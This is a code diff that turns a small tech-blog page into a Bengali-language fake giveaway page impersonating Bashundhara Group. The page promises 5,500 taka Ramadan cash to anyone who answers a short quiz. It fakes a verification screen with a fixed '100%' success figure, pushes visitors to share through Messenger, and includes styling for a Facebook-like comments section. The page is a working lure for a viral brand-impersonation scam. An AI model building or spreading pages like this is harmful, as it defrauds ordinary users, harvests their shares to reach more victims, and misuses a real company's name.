@@ -1,20 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-
-
-    <meta name="google-adsense-account" content="ca-pub-2488464843640158">
-
-    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2488464843640158"
-     crossorigin="anonymous"></script>
-
-
-    
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RoyzTech</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Bashundhara Group</title>
     <style>
         * {
             margin: 0;
@@ -22,748 +11,1045 @@
             box-sizing: border-box;
         }
 
-        :root {
-            --primary: #2563eb;
-            --secondary: #1e293b;
-            --light: #ffffff;
-            --gray: #64748b;
-            --light-gray: #f1f5f9;
-            --transition: all 0.3s ease;
-            --radius: 8px;
-            --shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-        }
-
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background-color: #ffffff;
-            color: var(--secondary);
-            line-height: 1.6;
-        }
-
-        /* Header */
-        header {
-            background-color: white;
-            padding: 1rem 1.5rem;
-            border-bottom: 1px solid #e2e8f0;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
-        }
-
-        .header-container {
+            font-family: 'Inter', 'Noto Sans Bengali', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #F0F2F5;
+            min-height: 100vh;
             display: flex;
-            justify-content: space-between;
+            flex-direction: column;
+        }
+
+        /* Top bar */
+        .top-bar {
+            width: 100%;
+            background: white;
+            padding: 12px 20px;
+            display: flex;
             align-items: center;
-            max-width: 1200px;
-            margin: 0 auto;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.06);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.02);
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 12px;
         }
 
         .logo {
-            font-size: 1.5rem;
-            font-weight: 700;
-            text-decoration: none;
-            color: var(--secondary);
+            width: 44px;
+            height: 44px;
+            object-fit: contain;
+            background: linear-gradient(145deg, #fafafa, #ffffff);
+            border-radius: 10px;
+            padding: 5px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.02);
+        }
+
+        .brand-text {
             display: flex;
-            align-items: center;
-            gap: 0.5rem;
+            flex-direction: column;
+            gap: 2px;
         }
 
-        .logo span:first-child {
-            color: var(--secondary);
+        .brand-name {
+            color: #C41E3A;
+            font-size: 1.3rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            line-height: 1;
+            text-transform: uppercase;
         }
 
-        .logo span:last-child {
-            color: var(--primary);
+        .slogan {
+            color: #2C2C2C;
+            font-size: 0.7rem;
+            font-weight: 400;
+            letter-spacing: 0.3px;
+            text-transform: uppercase;
+            opacity: 0.75;
         }
 
-        /* Mobile Menu Button */
-        .menu-toggle {
-            background: none;
-            border: none;
-            font-size: 1.5rem;
-            color: var(--secondary);
+        /* Hero message */
+        .hero-message {
+            width: 100%;
+            padding: 20px 20px 16px;
+            background: white;
+            text-align: center;
+            border-bottom: 1px solid rgba(0,0,0,0.05);
+        }
+
+        .ramadan-text {
+            font-size: 1.2rem;
+            font-weight: 600;
+            line-height: 1.4;
+            color: #1A1A1A;
+            max-width: 600px;
+            margin: 0 auto;
+            font-family: 'Noto Sans Bengali', 'Inter', sans-serif;
+        }
+
+        .ramadan-text span {
+            color: #C41E3A;
+            font-weight: 700;
+        }
+
+        /* Question Container */
+        .question-container {
+            width: 100%;
+            padding: 20px 20px;
+            background: linear-gradient(to bottom, #ffffff, #fafafa);
+            display: flex;
+            justify-content: center;
+            border-bottom: 1px solid rgba(0,0,0,0.05);
+        }
+
+        .question-box {
+            max-width: 600px;
+            width: 100%;
+            background: white;
+            border-radius: 24px;
+            padding: 28px;
+            box-shadow: 0 10px 30px rgba(196, 30, 58, 0.08);
+            border: 1px solid rgba(196, 30, 58, 0.1);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .question-box::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #C41E3A, #E68A8F);
+            border-radius: 24px 24px 0 0;
+        }
+
+        .question-badge {
+            display: inline-block;
+            background: rgba(196, 30, 58, 0.1);
+            color: #C41E3A;
+            font-size: 0.75rem;
+            font-weight: 700;
+            padding: 4px 12px;
+            border-radius: 20px;
+            margin-bottom: 12px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .question-title {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: #1A1A1A;
+            margin-bottom: 24px;
+            font-family: 'Noto Sans Bengali', 'Inter', sans-serif;
+            line-height: 1.5;
+            padding-bottom: 16px;
+            border-bottom: 2px solid rgba(196, 30, 58, 0.06);
+            position: relative;
+            letter-spacing: -0.01em;
+        }
+
+        .question-title::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            width: 60px;
+            height: 2px;
+            background: #C41E3A;
+            border-radius: 2px;
+        }
+
+        .options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .option {
+            width: 100%;
+            padding: 16px 22px;
+            background: white;
+            border: 1.5px solid rgba(0, 0, 0, 0.06);
+            border-radius: 16px;
+            font-size: 1.05rem;
+            font-weight: 500;
+            color: #2C2C2C;
+            text-align: left;
             cursor: pointer;
-            width: 40px;
-            height: 40px;
+            transition: all 0.2s cubic-bezier(0.2, 0.9, 0.4, 1);
+            font-family: 'Noto Sans Bengali', 'Inter', sans-serif;
+            background: white;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
+        }
+
+        .option:hover {
+            background: #fff5f6;
+            border-color: #C41E3A;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 16px rgba(196, 30, 58, 0.12);
+        }
+
+        .option:active {
+            transform: translateY(0);
+            box-shadow: 0 4px 8px rgba(196, 30, 58, 0.1);
+        }
+
+        .option::after {
+            content: '→';
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            opacity: 0;
+            color: #C41E3A;
+            font-size: 1.2rem;
+            transition: all 0.2s ease;
+        }
+
+        .option:hover::after {
+            opacity: 1;
+            right: 22px;
+        }
+
+        /* Progress indicator */
+        .question-progress {
+            margin-top: 28px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+            position: relative;
+        }
+
+        .progress-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 20px;
+            background: rgba(0, 0, 0, 0.08);
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            position: relative;
+        }
+
+        .progress-dot.active {
+            width: 32px;
+            background: #C41E3A;
+            box-shadow: 0 0 12px rgba(196, 30, 58, 0.3);
+        }
+
+        /* ===== JUDGING PAGE STYLES ===== */
+        .judging-container {
+            width: 100%;
+            padding: 40px 20px;
+            background: linear-gradient(to bottom, #ffffff, #fafafa);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 280px;
+            border-bottom: 1px solid rgba(0,0,0,0.05);
+        }
+
+        .judging-box {
+            max-width: 600px;
+            width: 100%;
+            background: white;
+            border-radius: 32px;
+            padding: 40px 28px;
+            box-shadow: 0 20px 40px rgba(196, 30, 58, 0.12);
+            border: 1px solid rgba(196, 30, 58, 0.15);
+            position: relative;
+            overflow: hidden;
+            text-align: center;
+        }
+
+        .judging-box::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 6px;
+            background: linear-gradient(90deg, #C41E3A, #E68A8F, #C41E3A);
+            background-size: 200% 100%;
+            animation: gradientMove 2s ease infinite;
+        }
+
+        @keyframes gradientMove {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .judging-animation {
+            margin-bottom: 28px;
+            position: relative;
+            height: 80px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .pulse-circle {
+            width: 70px;
+            height: 70px;
+            background: rgba(196, 30, 58, 0.08);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            animation: pulse 1.8s ease infinite;
+            position: relative;
+        }
+
+        .pulse-circle-inner {
+            width: 50px;
+            height: 50px;
+            background: rgba(196, 30, 58, 0.15);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            animation: pulseInner 1.8s ease infinite;
+        }
+
+        .pulse-circle-inner svg {
+            width: 30px;
+            height: 30px;
+            color: #C41E3A;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(0.9); opacity: 0.7; }
+            50% { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(0.9); opacity: 0.7; }
+        }
+
+        @keyframes pulseInner {
+            0% { transform: scale(0.9); opacity: 0.8; }
+            50% { transform: scale(1.2); opacity: 1; }
+            100% { transform: scale(0.9); opacity: 0.8; }
+        }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .judging-text-main {
+            font-size: 1.7rem;
+            font-weight: 800;
+            color: #1A1A1A;
+            margin-bottom: 16px;
+            font-family: 'Noto Sans Bengali', 'Inter', sans-serif;
+            line-height: 1.3;
+            animation: fadeInUp 0.6s ease;
+            background: linear-gradient(145deg, #1A1A1A, #2C2C2C);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.01em;
+        }
+
+        .judging-text-sub {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #C41E3A;
+            margin-bottom: 8px;
+            font-family: 'Noto Sans Bengali', 'Inter', sans-serif;
+            animation: fadeInUp 0.6s ease 0.2s both;
+            background: linear-gradient(145deg, #C41E3A, #E68A8F);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .judging-percent {
+            font-size: 2rem;
+            font-weight: 900;
+            color: #C41E3A;
+            display: inline-block;
+            animation: countUp 2s ease;
+            position: relative;
+        }
+
+        .judging-percent::after {
+            content: '১০০%';
+            animation: percentPulse 2s ease infinite;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes percentPulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.8; text-shadow: 0 0 10px rgba(196, 30, 58, 0.3); }
+            100% { opacity: 1; }
+        }
+
+        .judging-dots {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 24px;
+        }
+
+        .judging-dot {
+            width: 8px;
+            height: 8px;
+            background: rgba(196, 30, 58, 0.2);
+            border-radius: 50%;
+            animation: dotPulse 1.4s ease infinite;
+        }
+
+        .judging-dot:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .judging-dot:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes dotPulse {
+            0%, 100% { transform: scale(1); background: rgba(196, 30, 58, 0.2); }
+            50% { transform: scale(1.3); background: rgba(196, 30, 58, 0.6); }
+        }
+
+        /* ===== SHARE POPUP STYLES ===== */
+        .share-container {
+            width: 100%;
+            padding: 30px 20px 40px;
+            background: linear-gradient(to bottom, #ffffff, #f8f9fa);
+            display: flex;
+            justify-content: center;
+            border-bottom: 1px solid rgba(0,0,0,0.05);
+        }
+
+        .share-box {
+            max-width: 600px;
+            width: 100%;
+            background: white;
+            border-radius: 32px;
+            padding: 36px 28px;
+            box-shadow: 0 25px 50px rgba(196, 30, 58, 0.15);
+            border: 1px solid rgba(196, 30, 58, 0.2);
+            position: relative;
+            overflow: hidden;
+            animation: popIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        @keyframes popIn {
+            0% { opacity: 0; transform: scale(0.9); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+
+        .share-box::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 8px;
+            background: linear-gradient(90deg, #1877F2, #0084FF, #1877F2);
+            background-size: 200% 100%;
+            animation: gradientMove 3s ease infinite;
+        }
+
+        .thank-you-text {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: #1A1A1A;
+            margin-bottom: 16px;
+            font-family: 'Noto Sans Bengali', 'Inter', sans-serif;
+            line-height: 1.3;
+            text-align: center;
+            background: linear-gradient(145deg, #1A1A1A, #2C2C2C);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .share-instruction {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #C41E3A;
+            margin-bottom: 32px;
+            font-family: 'Noto Sans Bengali', 'Inter', sans-serif;
+            text-align: center;
+            line-height: 1.5;
+            padding: 0 10px;
+        }
+
+        .share-buttons {
+            display: flex;
+            gap: 16px;
+            justify-content: center;
+            margin-bottom: 32px;
+        }
+
+        .share-btn {
+            flex: 1;
+            max-width: 280px;
+            padding: 16px 24px;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            font-family: 'Noto Sans Bengali', 'Inter', sans-serif;
             display: flex;
             align-items: center;
             justify-content: center;
-            border-radius: var(--radius);
-            transition: var(--transition);
-        }
-
-        .menu-toggle:hover {
-            background-color: var(--light-gray);
-        }
-
-        /* Navigation */
-        .nav-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
-            z-index: 99;
-            opacity: 0;
-            visibility: hidden;
-            transition: var(--transition);
-        }
-
-        .nav-overlay.active {
-            opacity: 1;
-            visibility: visible;
-        }
-
-        /* Mobile Navigation */
-        .mobile-nav {
-            position: fixed;
-            top: 0;
-            right: -100%;
-            width: 85%;
-            max-width: 320px;
-            height: 100%;
-            background-color: white;
-            z-index: 100;
-            transition: var(--transition);
-            padding: 2rem 0;
-            display: flex;
-            flex-direction: column;
-            box-shadow: -5px 0 15px rgba(0, 0, 0, 0.1);
-        }
-
-        .mobile-nav.active {
-            right: 0;
-        }
-
-        .nav-header {
-            padding: 0 1.5rem 1.5rem;
-            border-bottom: 1px solid #e2e8f0;
-            margin-bottom: 1rem;
-        }
-
-        .nav-title {
-            font-size: 1.1rem;
-            font-weight: 600;
-            color: var(--gray);
-        }
-
-        .nav-links {
-            list-style: none;
-            flex: 1;
-            overflow-y: auto;
-            padding: 0 0.5rem;
-        }
-
-        .nav-links li {
-            margin-bottom: 0.25rem;
-        }
-
-        .nav-links a {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0.875rem 1.25rem;
-            text-decoration: none;
-            color: var(--secondary);
-            font-weight: 500;
-            border-radius: var(--radius);
-            transition: var(--transition);
-        }
-
-        .nav-links a:hover,
-        .nav-links a.active {
-            background-color: var(--light-gray);
-            color: var(--primary);
-        }
-
-        .nav-links a i {
-            font-size: 0.8rem;
-            transition: var(--transition);
-        }
-
-        /* Legal Dropdown */
-        .legal-dropdown {
-            max-height: 0;
-            overflow: hidden;
-            transition: max-height 0.3s ease;
-            background-color: #f8fafc;
-            border-radius: var(--radius);
-            margin: 0.25rem 1.25rem;
-        }
-
-        .legal-dropdown.active {
-            max-height: 250px; /* Increased for additional item */
-            margin-top: 0.5rem;
-            margin-bottom: 0.5rem;
-        }
-
-        .legal-dropdown a {
-            padding: 0.75rem 1.5rem;
-            font-size: 0.95rem;
-            color: var(--gray);
-            border-bottom: 1px solid #e2e8f0;
-        }
-
-        .legal-dropdown a:last-child {
-            border-bottom: none;
-        }
-
-        .legal-dropdown a:hover {
-            background-color: #e2e8f0;
-            color: var(--primary);
-        }
-
-        /* Desktop Navigation */
-        .desktop-nav {
-            display: none;
-        }
-
-        .desktop-nav ul {
-            list-style: none;
-            display: flex;
-            gap: 1.5rem;
-            align-items: center;
-        }
-
-        .desktop-nav a {
-            text-decoration: none;
-            color: var(--secondary);
-            font-weight: 500;
-            padding: 0.5rem 0;
-            position: relative;
-            transition: var(--transition);
-        }
-
-        .desktop-nav a:hover {
-            color: var(--primary);
-        }
-
-        .desktop-nav a::after {
-            content: '';
-            position: absolute;
-            width: 0;
-            height: 2px;
-            bottom: 0;
-            left: 0;
-            background-color: var(--primary);
-            transition: var(--transition);
-        }
-
-        .desktop-nav a:hover::after {
-            width: 100%;
-        }
-
-        /* Desktop Legal Dropdown */
-        .desktop-nav .nav-item {
-            position: relative;
-        }
-
-        .desktop-legal-dropdown {
-            position: absolute;
-            top: 100%;
-            left: 0;
-            width: 220px; /* Slightly wider for new item */
-            background-color: white;
-            box-shadow: var(--shadow);
-            border-radius: var(--radius);
-            z-index: 10;
-            opacity: 0;
-            visibility: hidden;
-            transform: translateY(-10px);
-            transition: var(--transition);
-        }
-
-        .desktop-legal-dropdown.active {
-            opacity: 1;
-            visibility: visible;
-            transform: translateY(0);
-        }
-
-        .desktop-legal-dropdown a {
-            display: block;
-            padding: 0.75rem 1rem;
-            color: var(--gray);
-            border-bottom: 1px solid #e2e8f0;
-        }
-
-        .desktop-legal-dropdown a:last-child {
-            border-bottom: none;
-        }
-
-        .desktop-legal-dropdown a:hover {
-            background-color: var(--light-gray);
-            color: var(--primary);
-        }
-
-        .desktop-nav .legal-link {
-            display: flex;
-            align-items: center;
-            gap: 0.25rem;
-        }
-
-        .legal-arrow {
-            font-size: 0.7rem;
-            transition: var(--transition);
-        }
-
-        .desktop-nav .legal-link.active .legal-arrow {
-            transform: rotate(180deg);
-        }
-
-        /* Main Content */
-        main {
-            padding: 2rem 1.5rem;
-            max-width: 1200px;
+            gap: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            color: white;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+            background: linear-gradient(145deg, #0084FF, #1877F2);
             margin: 0 auto;
         }
 
-        /* Cards Section */
-        .section-title {
-            font-size: 2rem;
-            font-weight: 700;
-            color: var(--secondary);
-            margin-bottom: 2rem;
+        .share-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 28px rgba(24, 119, 242, 0.4);
+        }
+
+        .share-btn:active {
+            transform: translateY(0);
+        }
+
+        .share-btn svg {
+            width: 24px;
+            height: 24px;
+            fill: white;
+        }
+
+        /* Progress line - clean, no text */
+        .progress-line-container {
+            margin-top: 24px;
             text-align: center;
         }
 
-        .section-title span {
-            color: var(--primary);
-        }
-
-        .cards-container {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 1.5rem;
-        }
-
-        .card {
-            background-color: white;
-            border-radius: var(--radius);
-            overflow: hidden;
-            box-shadow: var(--shadow);
-            transition: var(--transition);
-            cursor: pointer;
-            border: 1px solid #e2e8f0;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-            border-color: var(--primary);
-        }
-
-        .card-image {
+        .progress-track {
             width: 100%;
-            height: 200px;
-            object-fit: cover;
-            display: block;
+            height: 12px;
+            background: rgba(0, 0, 0, 0.06);
+            border-radius: 30px;
+            overflow: hidden;
+            box-shadow: inset 0 1px 4px rgba(0,0,0,0.02);
         }
 
-        .card-content {
-            padding: 1.5rem;
-            flex: 1;
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #1877F2, #0084FF, #1877F2);
+            background-size: 200% 100%;
+            border-radius: 30px;
+            transition: width 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            animation: gradientMove 3s ease infinite;
+            box-shadow: 0 0 12px rgba(24, 119, 242, 0.3);
+        }
+
+        /* Hide/show classes */
+        .hidden {
+            display: none !important;
+        }
+
+        /* Facebook-style comments section */
+        .comments-section {
+            width: 100%;
+            padding: 20px;
+            background: #F0F2F5;
             display: flex;
-            flex-direction: column;
+            justify-content: center;
         }
 
-        .card-title {
-            font-size: 1.25rem;
+        .comments-container {
+            max-width: 600px;
+            width: 100%;
+            background: white;
+            border-radius: 16px;
+            padding: 16px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.02);
+        }
+
+        .comments-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 16px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid rgba(0,0,0,0.1);
+        }
+
+        .comments-header h3 {
+            font-size: 1rem;
             font-weight: 600;
-            color: var(--secondary);
-            margin-bottom: 0.75rem;
-            line-height: 1.4;
+            color: #050505;
         }
 
-        .card-meta {
+        .comments-header span {
+            background: #C41E3A;
+            color: white;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            font-weight: 500;
+        }
+
+        .comment {
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: auto;
-            padding-top: 1rem;
-            border-top: 1px solid #e2e8f0;
-            color: var(--gray);
-            font-size: 0.875rem;
+            gap: 12px;
+            margin-bottom: 16px;
         }
 
-        .card-views, .card-date {
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
+        .comment-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            overflow: hidden;
+            flex-shrink: 0;
+            background: #E4E6EB;
+            border: 1px solid rgba(0,0,0,0.05);
         }
 
-        .card-views i, .card-date i {
-            color: var(--primary);
+        .comment-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
 
-        .loading {
-            text-align: center;
-            padding: 3rem;
-            color: var(--gray);
-            font-size: 1.1rem;
+        .comment-content {
+            flex: 1;
         }
 
-        .loading i {
-            display: block;
-            font-size: 2rem;
-            margin-bottom: 1rem;
-            color: var(--primary);
+        .comment-bubble {
+            background: #F0F2F5;
+            border-radius: 18px;
+            padding: 12px 16px;
+            display: inline-block;
+            max-width: 100%;
         }
 
-        .error {
-            text-align: center;
-            padding: 3rem;
-            color: #dc2626;
-            background-color: #fef2f2;
-            border-radius: var(--radius);
-            border: 1px solid #fecaca;
-        }
-
-        .error i {
-            display: block;
-            font-size: 2rem;
-            margin-bottom: 1rem;
-        }
-
-        /* Footer */
-        footer {
-            background-color: #f8fafc;
-            padding: 2rem 1.5rem;
-            text-align: center;
-            border-top: 1px solid #e2e8f0;
-            margin-top: 2rem;
-        }
-
-        .footer-text {
-            color: var(--gray);
+        .comment-author {
+            font-weight: 600;
             font-size: 0.9rem;
+            color: #050505;
+            margin-bottom: 4px;
         }
 
-        /* Responsive Design */
-        @media (min-width: 640px) {
-            .cards-container {
-                grid-template-columns: repeat(2, 1fr);
-            }
+        .comment-text {
+            font-size: 0.95rem;
+            color: #050505;
+            line-height: 1.4;
+            font-family: 'Noto Sans Bengali', 'Inter', sans-serif;
+            word-wrap: break-word;
         }
 
-        @media (min-width: 1024px) {
-            .cards-container {
-                grid-template-columns: repeat(3, 1fr);
+        .comment-meta {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-top: 6px;
+            margin-left: 8px;
+            font-size: 0.75rem;
+            color: #65676B;
+        }
+
+        .comment-meta span {
+            cursor: pointer;
+            font-weight: 500;
+        }
+
+        /* Responsive */
+        @media screen and (max-width: 480px) {
+            .top-bar {
+                padding: 10px 16px;
             }
             
-            .section-title {
-                font-size: 2.5rem;
-                text-align: left;
+            .logo {
+                width: 40px;
+                height: 40px;
             }
-        }
-
-        /* Desktop Styles */
-        @media (min-width: 769px) {
-            .menu-toggle {
-                display: none;
+            
+            .brand-name {
+                font-size: 1.1rem;
             }
-
-            .mobile-nav {
-                display: none;
+            
+            .slogan {
+                font-size: 0.65rem;
             }
 
-            .nav-overlay {
-                display: none;
+            .ramadan-text {
+                font-size: 1rem;
             }
 
-            .desktop-nav {
-                display: block;
+            .question-box {
+                padding: 22px;
+            }
+
+            .judging-text-main {
+                font-size: 1.4rem;
+            }
+
+            .thank-you-text {
+                font-size: 1.5rem;
+            }
+
+            .share-instruction {
+                font-size: 1rem;
+            }
+
+            .share-btn {
+                max-width: 100%;
             }
         }
     </style>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Noto+Sans+Bengali:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 </head>
 <body>
-    <!-- Header -->
-    <header>
-        <div class="header-container">
-            <a href="../index.html" class="logo">
-                <span>Royz</span><span>Tech</span>
-            </a>
-
-            <!-- Desktop Navigation -->
-            <nav class="desktop-nav">
-                <ul>
-                    <li><a href="../index.html">Home</a></li>
-                    <li><a href="../blog/index.html">Blog</a></li>
-                    <li><a href="../about/index.html">About</a></li>
-                    <li class="nav-item">
-                        <a href="#" class="legal-link" id="desktopLegalLink">
-                            <span>Legal</span>
-                            <i class="fas fa-chevron-down legal-arrow"></i>
-                        </a>
-                        <div class="desktop-legal-dropdown" id="desktopLegalDropdown">
-                            <a href="../privacy/index.html">Privacy Policy</a>
-                            <a href="../disclaimer/index.html">Disclaimer</a>
-                            <a href="../term/index.html">Terms of Service</a>
-                            <a href="../cookies/index.html">Cookies Policy</a>
-                        </div>
-                    </li>
-                    <li><a href="../contact/index.html">Contact</a></li>
-                </ul>
-            </nav>
-
-            <!-- Mobile Menu Button -->
-            <button class="menu-toggle" id="menuToggle">
-                <i class="fas fa-bars"></i>
-            </button>
-
-            <!-- Navigation Overlay -->
-            <div class="nav-overlay" id="navOverlay"></div>
-
-            <!-- Mobile Navigation Menu -->
-            <nav class="mobile-nav" id="mobileNav">
-                <div class="nav-header">
-                    <div class="nav-title">Navigation</div>
-                </div>
-
-                <ul class="nav-links">
-                    <li><a href="../index.html"><i class="fas fa-home"></i> Home</a></li>
-                    <li><a href="../blog/index.html"><i class="fas fa-blog"></i> Blog</a></li>
-                    
-                    <li><a href="../about/index.html"><i class="fas fa-info-circle"></i> About</a></li>
-                    <li>
-                        <a href="#" class="legal-link" id="mobileLegalLink">
-                            <span><i class="fas fa-balance-scale"></i> Legal</span>
-                            <i class="fas fa-chevron-down legal-arrow"></i>
-                        </a>
-                        <div class="legal-dropdown" id="mobileLegalDropdown">
-                            <a href="../privacy/index.html"><i class="fas fa-shield-alt"></i> Privacy Policy</a>
-                            <a href="../disclaimer/index.html"><i class="fas fa-exclamation-triangle"></i> Disclaimer</a>
-                            <a href="../term/index.html"><i class="fas fa-file-contract"></i> Terms of Service</a>
-                            <a href="../cookies/index.html"><i class="fas fa-cookie-bite"></i> Cookies Policy</a>
-                        </div>
-                    </li>
-                    <li><a href="../contact/index.html"><i class="fas fa-envelope"></i> Contact</a></li>
-                </ul>
-            </nav>
-        </div>
-    </header>
-
-    <!-- Main Content -->
-    <main>
-        <h1 class="section-title">Top <span>For You</span></h1>
-        
-        <div id="cardsContainer" class="cards-container">
-            <div class="loading">
-                <i class="fas fa-spinner fa-spin"></i>
-                <p>Loading content...</p>
+    <!-- Top bar -->
+    <div class="top-bar">
+        <div class="logo-container">
+            <img src="asset/logo.png" alt="Bashundhara Group" class="logo" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+            <div style="display:none; width:44px; height:44px; background:linear-gradient(145deg, #f0f0f0, #fafafa); border-radius:10px; align-items:center; justify-content:center; font-size:18px;">🏢</div>
+            
+            <div class="brand-text">
+                <span class="brand-name">BASHUNDHARA GROUP</span>
+                <span class="slogan">for the people, for the country</span>
             </div>
         </div>
-    </main>
+    </div>
 
-    <!-- Footer -->
-    <footer>
-        <p class="footer-text">&copy; <span id="currentYear"></span> RoyzTech. All rights reserved.</p>
-    </footer>
+    <!-- Hero message -->
+    <div class="hero-message">
+        <div class="ramadan-text">
+            রমজান উপলক্ষে বসুন্ধরা গ্রুপের পক্ষ থেকে আপনি পাচ্ছেন <span>৫,৫০০ টাকা নগদ।</span><br>
+            বোনাস পেতে নিচের প্রশ্নগুলোর উত্তর দিন।
+        </div>
+    </div>
+
+    <!-- Question Container -->
+    <div id="questionSection" class="question-container">
+        <div class="question-box">
+            <div class="question-badge">প্রশ্ন</div>
+            <div class="question-title" id="questionText">প্রশ্ন ১: আপনি কি বাংলাদেশের নাগরিক?</div>
+            
+            <div class="options" id="optionsContainer"></div>
+
+            <div class="question-progress" id="progressDots">
+                <div class="progress-dot active"></div>
+                <div class="progress-dot"></div>
+                <div class="progress-dot"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Judging Container (hidden by default) -->
+    <div id="judgingSection" class="judging-container hidden">
+        <div class="judging-box">
+            <div class="judging-animation">
+                <div class="pulse-circle">
+                    <div class="pulse-circle-inner">
+                        <svg width="30" height="30" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <circle cx="12" cy="12" r="10" stroke="#C41E3A" stroke-width="2" stroke-dasharray="4 4"/>
+                            <path d="M12 8V12L15 15" stroke="#C41E3A" stroke-width="2" stroke-linecap="round"/>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+            <div class="judging-text-main">আপনার উত্তর যাচাই চলছে।</div>
+            <div class="judging-text-sub">সঠিক উত্তর দিলে আপনার বোনাস পাওয়ার সম্ভাবনা <span class="judging-percent"></span></div>
+            <div class="judging-dots">
+                <div class="judging-dot"></div>
+                <div class="judging-dot"></div>
+                <div class="judging-dot"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Share Container - ONLY Messenger button, NO hint text -->
+    <div id="shareSection" class="share-container hidden">
+        <div class="share-box">
+            <div class="thank-you-text">সঠিক উত্তর দেওয়ার জন্য আপনাকে ধন্যবাদ।</div>
